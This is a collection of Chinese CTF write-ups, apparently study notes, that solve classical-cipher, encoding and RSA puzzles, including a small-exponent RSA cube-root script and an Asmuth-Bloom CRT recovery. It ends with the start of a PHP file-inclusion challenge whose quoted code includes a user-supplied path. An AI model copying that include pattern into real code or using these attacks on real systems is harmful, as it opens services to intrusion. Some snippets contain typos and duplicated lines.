Uuencode是二进制信息和文字信息之间的转换编码，也就是机器和人眼识读的转换。Uuencode编码方案常见于电子邮件信息的传输，目前已被多用途互联网邮件扩展（MIME）大量取代。

Uuencode将输入文字以每三个字节为单位进行编码，如此重复进行。如果最后剩下的文字少于三个字节，不够的部份用零补齐。这三个字节共有24个Bit，以6-bit为单位分为4个群组，每个群组以十进制来表示所出现的数值只会落在0到63之间。将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白...95-底线）的范围之中。

Uuencode编码每60个将输出为独立的一行（相当于45个输入字节），每行的开头会加上长度字符，除了最后一行之外，长度字符都应该是“M”这个ASCII字符（77=32+45），最后一行的长度字符为32+剩下的字节数目这个ASCII字符。



## Dangerous RSA

我们发现这又是一个RSA的题，但是E的值比较小，可以用小指数攻击

写一个脚本吧

```python
from crypto.Util.number import long_to_bytes
import primefac
def modinv(a,n):
    return primefac.modinv(a,n)%n
n=0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793
e=0x3
c=0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365
import gmpy2
i=0
while 1:
    if(gmpy2.iroot(c+i*n,3)[1]==1):
        print(long_to_bytes(gmpy2.iroot(c+i*n,3)[0]))
        break
    i+=1
```



## Morse

摩尔解完后直接16进制转zfc



## 达芬奇密码

这里考的是：**斐波那契数列**

> 1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181 6765 10946 17711 28657 46368 75025 121393 196418 317811 514229 832040 1346269 2178309

分析发现神秘数字串为32位，数字列也有32个数字，而flag也为一串32位10进制字符串。猜测神秘数字串可能为密文`c`，且和数字列存在一一映射的关系。

因此，找到对应关系

> 第`0`位的`1`就在斐波那契数列第`0`位，所以`3`的位置不变，还在第`0`位。
> 第`1`位的`233`的位置在斐波那契数列第`12`位，所以`6`应该移到第`12`位。

神秘数字串:36968853882116725547342176952286

修改顺序

得到flag：37995588256861228614165223347687



## rsa2

得到一份py文件，观察e,n可以知道这是一道**低解密指数攻击**



## 传感器

### 考点：曼彻斯特编码

曼彻斯特编码（Manchester Encoding），也叫做相位编码（ Phase Encode，简写PE），是一个同步时钟编码技术，被物理层使用来编码一个同步位流的时钟和数据。它在以太网媒介系统中的应用属于数据通信中的两种位同步方法里的自同步法（另一种是外同步法），即接收方利用包含有同步信号的特殊编码从信号自身提取同步信号来锁定自己的时钟脉冲频率，达到同步目的。

 **01电平跳变表示1, 10的电平跳变表示0**

> `5555555595555A65556AA696AA6666666955`转为二进制，根据01->1,10->0。可得到
> 0101->11
> 0110->10
> 1010->00
> 1001->01
> decode得到
> `11111111 11111111 01111111 11001011 11111000 00100110 00001010 10101010 10011111`
> bin->hex，对比ID并不重合，根据八位倒序传输协议将二进制每八位reverse，转hex即可

```python
cipher='5555555595555A65556AA696AA6666666955'
def iee(cipher):
    tmp=''
    for i in range(len(cipher)):
        a=bin(eval('0x'+cipher[i]))[2:].zfill(4)
        tmp=tmp+a[1]+a[3]
        print(tmp)
    plain=[hex(int(tmp[i:i+8][::-1],2))[2:] for i in range(0,len(tmp),8)]
    print(''.join(plain).upper())

iee(cipher)
```



## CheckIn

首先Base64解密

```
dikqTCpfRjA8fUBIMD5GNDkwMjNARkUwI0BFTg==
```

其中：v对应G（GXY）或f（flag）

```
v)*L*_F0<}@H0>F49023@FE0#@EN
```

v到G位移47用[ROT47解密](https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php)

```
GXY{Y0u_kNow_much_about_Rot}
```





## 四面八方

### 考点：四方密码

根据题目意思，可以理解为四方加密。题目给了我们两个密钥，我们需要根据密钥得到加密矩阵。

> key1:security
> key2:information
>
> 密文啊这是，骚年加油：zhnjinhoopcfcuktlj

我们要处理一下密钥

1. 只保留密钥中第一次出现的字母，key1：security，key2：informat
2. 补全剩下的字符，key1：securityabdfghklmnopqvwxz，key2：informatbcdeghklpqsuvwxyz

放入[加密网站](http://www.practicalcryptography.com/ciphers/classical-era/four-square/)进行解密，得到：`YPQCGAODRTCCESNKQA`

![BUUCTF_四面八方](images/BUUCTF%20web.assets/BUUCTF_%E5%9B%9B%E9%9D%A2%E5%85%AB%E6%96%B9-1609938641079.png)

我们还需要词频分析一下，得到：youngandsuccessful









## [AFCTF2018]花开藏宝地

杂项题，看了以后根据提示。

- secret1是爆破生日数字：19260817

- secret2爆破英文字母：alice

- secret4伪加密

- secret5 ntfs隐写



得到四组x和m，题目说只要3组就行了

应该是e=3，然后共模攻击。即明文m不变，给出改变的c和n。可是如果是这样，为什么还需要提示一个大数？

而且实际运算以后，并无法得到flag

百度了一下，原来这是标准的**门限秘密共享方案(threshold secret sharing scheme),简称门限方案**：http://www.matrix67.com/blog/archives/1261

> 假设公司董事会共五个人，每个人保存秘钥的一部分。要求三个人在场就可以拿到秘钥打开保险箱，而且保险箱打开后，无法知道到底是哪三个人提供的秘钥。



和这题提示正好对应：

> 于是我把藏宝图分成了5份，交给五位贤者让他们帮我妥善保管，并且只要搜集3份就可以获得宝藏的地址。



门限加密有多种方案，举个例子，三个平面能确定一个点。而有无数平面通过同一个点。

题目标题为花开，即Asmnth-Bloom方案

利用的就是中国剩余数定理，可以给出很多组n和c，满足m mod n =c，然后根据其中的几组就可以找到解，但要注意crt的有多解，只要是m+kn1n2……nn的都满足。

这题同理：

```python
rom Crypto.Util.number import *

z=80804238007977405688648566160504278593148666302626415149704905628622876270862865768337953835725801963142685182510812938072115996355782396318303927020705623120652014080032809421180400984242061592520733710243483947230962631945045134540159517488288781666622635328316972979183761952842010806304748313326215619695085380586052550443025074501971925005072999275628549710915357400946408857

x5 = 230502064382947282343660159791611936696520807970361139469603458689311286041516767875903549263861950740778705012699983268093626403307298415066249636346303539570207577050391796770068203937723627361951969413683246596072925692670365490970847825269581004483964261491917680759091791653759514213188778401968676433284753781006738293752440186858616315727565803777032119737689210471541053061940547213
m5 = 347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820822249
x4 = 100459779913520540098065407420629954816677926423356769524759072632219106155849450125185205557491138357760494272691949199099803239098119602186117878931534968435982565071570831032814288620974807498206233914826253433847572703407678712965098320122549759579566316372220959610814573945698083909575005303253205653244238542300266460559790606278310650849881421791081944960157781855164700773081375247
m4 = 347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820820091
x2 = 152012681270682340051690627924586232702552460810030322267827401771304907469802591861912921281833890613186317787813611372838066924894691892444503039545946728621696590087591246339208248647926966446848123290344911662916758039134817404720512465817867255277476717353439505243247568126193361558042940352204093381260402400739429050280526212446967632582771424597203000629197487733610187359662268583
m2 = 347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820818553
x2 = 152012681270682340051690627924586232702552460810030322267827401771304907469802591861912921281833890613186317787813611372838066924894691892444503039545946728621696590087591246339208248647926966446848123290344911662916758039134817404720512465817867255277476717353439505243247568126193361558042940352204093381260402400739429050280526212446967632582771424597203000629197487733610187359662268583
m2 = 347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820818553

x1 = 305345133911395218573790903508296238659147802274031796643017539011648802808763162902335644195648525375518941848430114497150082025133000033835083076541927530829557051524161069423494451667848236452337271862085346869364976989047180532167560796470067549915390773271207901537847213882479997325575278672917648417868759077150999044891099206133296336190476413164240995177077671480352739572539631359
m1 = 347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820813413
c=[x1,x2,x4]
n=[m1,m2,m4]
a=crt(c,n)
#通过这一步来去除掉kn1n2n3的干扰，实际上这题题目中给你的就是n1*n2*n3*n4*n5.
r=a%z
print(long_to_bytes(r))
#b"A treasure map is a map that marks the location of buried treasure, a lost mine, a valuable secret or a hidden locale. So flag is afctf{1sn't_s0_int3Resting}."
```





## 密码学的心声

二战时期，某国军官与一个音乐家情妇相好，然而自从那时起，他屡战屡败，敌人似乎料事如神。他也有怀疑过他的情妇，但是他经过24小时观察他的情妇，发现她每天都只是作曲，然后弹奏给战地电台，为士兵们鼓气，并未有任何逾越。那么，间谍到底是谁？这张曲谱是否有猫腻？

图片中的线索很明显ASCLL码 八进制，数字三个一组，转换就行了

```python
s = '111 114 157 166 145 123 145 143 165 162 151 164 171 126 145 162 171 115 165 143 150'
tmp = [s.split(' ')[i] for i in range(len(s.split(' ')))]
cipher = ''
for i in tmp:
    cipher += chr(int(i,8))
flag = "flag{"+cipher+"}"
print(flag)
# flag{ILoveSecurityVeryMuch}
```





## 神秘龙卷风

拿到一个加密的rar，提示四位数字，我们就爆破一下，密码为：5463

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200913145844363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70#pic_center)

打开得到

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200913145931119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70#pic_center)

`brainfuck`代码，使用在线执行网站运行即可得到flag：http://bf.doleczek.pl/

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200913150058341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70#pic_center)





## [MRCTF2020]古典密码知多少

#### 考点：古典密码

这张图混合了多种古典密码

![BUUCTF古典密码知多少1](images/BUUCTF.assets/BUUCTF%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E7%9F%A5%E5%A4%9A%E5%B0%911.png)

- **蓝色**的字符为猪圈密码
- **橙色**为猪圈密码的变种**圣堂武士密码**
- **黑色**的字符属实冷门，看起来很熟悉，但是实在是查不到（陌生又熟悉。。。），经过大佬的告知才知道是**标准银河字母**

将密文经过栅栏解密得到flag：FLAG IS CRYPTOFUN





## [MRCTF2020]天干地支+甲子

题目如图

![img](https://img-blog.csdnimg.cn/img_convert/bfcde7fd9600e724ea2e866e18db806b.png)

查询百度得到：**天干有十个，地支有十二个，六十甲子**

所以这里用刚刚文件里的内容对照甲子的顺序数+60，通过ASCII码转换得到flag
flag：flag{Goodjob}





## [MRCTF2020]vigenere

#### 考点：维吉尼亚

题目提示维吉尼亚，随便找了个在线网站在线解密，接出来最后一行就是flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210115180144664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xpbmdESUhvbmc=,size_16,color_FFFFFF,t_70)

flag：flag{vigenere_crypto_crack_man}





## [WUSTCTF2020]佛说：只能四天

#### 考点：新约佛论禅+社会主义核心价值观解码+栅栏密码+凯撒密码+Base32解码

题目：

```
尊即寂修我劫修如婆愍闍嚤婆莊愍耨羅嚴是喼婆斯吶眾喼修迦慧迦嚩喼斯願嚤摩隸所迦摩吽即塞願修咒莊波斯訶喃壽祗僧若即亦嘇蜜迦須色喼羅囉咒諦若陀喃慧愍夷羅波若劫蜜斯哆咒塞隸蜜波哆咤慧聞亦吽念彌諸嘚嚴諦咒陀叻咤叻諦缽隸祗婆諦嚩阿兜宣囉吽色缽吶諸劫婆咤咤喼愍尊寂色缽嘚闍兜阿婆若叻般壽聞彌即念若降宣空陀壽愍嚤亦喼寂僧迦色莊壽吽哆尊僧喼喃壽嘚兜我空所吶般所即諸吽薩咤諸莊囉隸般咤色空咤亦喃亦色兜哆嘇亦隸空闍修眾哆咒婆菩迦壽薩塞宣嚩缽寂夷摩所修囉菩阿伏嘚宣嚩薩塞菩波吶波菩哆若慧愍蜜訶壽色咒兜摩缽摩諦劫諸陀即壽所波咤聞如訶摩壽宣咤彌即嚩蜜叻劫嘇缽所摩闍壽波壽劫修訶如嚩嘇囉薩色嚤薩壽修闍夷闍是壽僧劫祗蜜嚴嚩我若空伏諦念降若心吽咤隸嘚耨缽伏吽色寂喃喼吽壽夷若心眾祗喃慧嚴即聞空僧須夷嚴叻心願哆波隸塞吶心須嘇摩咤壽嘚吶夷亦心亦喃若咒壽亦壽囑囑
```

1、这里用[与佛论禅](http://www.keyfc.net/bbs/tools/tudoucode.aspx)解不出来，“新约全书”可能是提示吧，最后用[新约佛论禅](http://hi.pcmoe.net/buddha.html)解得

注意：前面要加上“佛曰：”

```
平等文明自由友善公正自由诚信富强自由自由平等民主平等自由自由友善敬业平等公正平等富强平等自由平等民主和谐公正自由诚信平等和谐公正公正自由法治平等法治法治法治和谐和谐平等自由和谐自由自由和谐公正自由敬业自由文明和谐平等自由文明和谐平等和谐文明自由和谐自由和谐和谐平等和谐法治公正诚信平等公正诚信民主自由和谐公正民主平等平等平等平等自由和谐和谐和谐平等和谐自由诚信平等和谐自由自由友善敬业平等和谐自由友善敬业平等法治自由法治和谐和谐自由友善公正法治敬业公正友善爱国公正民主法治文明自由民主平等公正自由法治平等文明平等友善自由平等和谐自由友善自由平等文明自由民主自由平等平等敬业自由平等平等诚信富强平等友善敬业公正诚信平等公正友善敬业公正平等平等诚信平等公正自由公正诚信平等法治敬业公正诚信平等法治平等公正友善平等公正诚信自由公正友善敬业法治法治公正公正公正平等公正诚信自由公正和谐公正平等
```

2、拿[社会主义核心价值观编码](https://atool.vip/corevalue/)解码：

```
RLJDQTOVPTQ6O6duws5CD6IB5B52CC57okCaUUC3SO4OSOWG3LynarAVGRZSJRAEYEZ_ooe_doyouknowfence
```

3、字符串末提示栅栏密码，起初将整个字符串放进去解码发现怎么也得不到有用的信息。。。实际上要先把后面的提示信息去掉，再解码。也即：

```
RLJDQTOVPTQ6O6duws5CD6IB5B52CC57okCaUUC3SO4OSOWG3LynarAVGRZSJRAEYEZ_ooe用4位栅栏密码
```

最后[栅栏密码解密](https://www.qqxiuzi.cn/bianma/zhalanmima.php)结果为：

```
R5UALCUVJDCGD63RQISZTBOSO54JVBORP5SAT2OEQCWY6CGEO53Z67L_doyouknowCaesar
```

4、同理这里去掉提示信息，再用[凯撒密码](https://www.qqxiuzi.cn/bianma/kaisamima.php)解密，这里的凯撒密码移位数为3，结果是：

```
O5RXIZRSGAZDA63ONFPWQYLPL54GSYLOM5PXQ2LBNZTV6ZDBL53W67I
```

5、再通过[Base32解码](https://www.qqxiuzi.cn/bianma/base.php)得到：

```
wctf2020{ni_hao_xiang_xiang_da_wo}
```







# Mise













## [HCTF 2018]WarmUp

### 考点：文件包含

查看网页源代码发现一个被注释的地址，直接进入

```php
$whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }
```

发现另一个文件，hint.php，进入后发现，网页提示：`flag not here, and flag in ffffllllaaaagggg`

回到source.php代码，首先看下面部分:

```php
if(! empty($_REQUEST['file'])  		//$_REQUEST['file']值非空
    && is_string($_REQUEST['file'])  		//$_REQUEST['file']值为字符串
    && emmm::checkFile($_REQUEST['file']) 		 //能够通过checkFile函数校验
    )
	{
     include $_REQUEST['file']; 		 //包含$_REQUEST['file']文件
     exit;q
    }
	 else 
	{
     echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";				 //打印滑稽表情
    }  
```

一个if语句要求传入的file变量：

- 非空
- 类型为字符串
- 能够通过checkFile()函数，即页面上面函数的校验

同时满足以上三个要求即可包含file中的文件，否则打印滑稽表情